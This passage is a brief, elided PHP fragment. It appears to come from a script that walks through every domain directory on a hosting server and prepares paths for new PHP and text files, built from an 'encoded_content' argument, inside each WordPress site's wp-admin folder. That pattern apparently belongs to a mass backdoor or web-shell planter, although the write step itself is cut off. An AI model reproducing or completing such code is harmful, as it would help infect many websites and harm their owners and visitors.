    ...
    private function processDirectories($domains_path, $encoded_content) {
        ...
        foreach ($contents as $item) {
            if ($item != '.' && $item != '..' && is_dir($domains_path . $item)) {
                $directories[] = $item;
                $txt_file_path = $domains_path . $item . '/public_html/wp-admin/' . $this->new_txt_file_path;
                $php_file_path = $domains_path . $item . '/public_html/wp-admin/' . $this->new_php_file_path;
